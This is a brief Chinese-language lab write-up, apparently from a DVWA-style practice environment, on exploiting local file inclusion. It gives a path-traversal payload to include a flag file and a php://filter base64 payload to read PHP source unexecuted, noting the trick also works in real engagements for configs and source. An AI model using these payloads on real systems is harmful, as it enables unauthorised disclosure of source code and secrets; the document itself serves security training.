## LFI 读文件

```payload
?page=../../hackable/flags/fi.php
```


![](99_Attachments/图片/1.Low/file-20260715104547754.png)



PHP 会执行，隐藏了第三行。换个方式**用 base64 过滤器读源码****：

```payload
?page=php://filter/convert.base64-encode/resource=../../hackable/flags/fi.php
```

![50000](99_Attachments/图片/1.Low/file-20260715104705418.png)
解码就能看到被 PHP 藏起来的真实内容。实战中同样有用——绕过 PHP 执行直接读配置/源码。
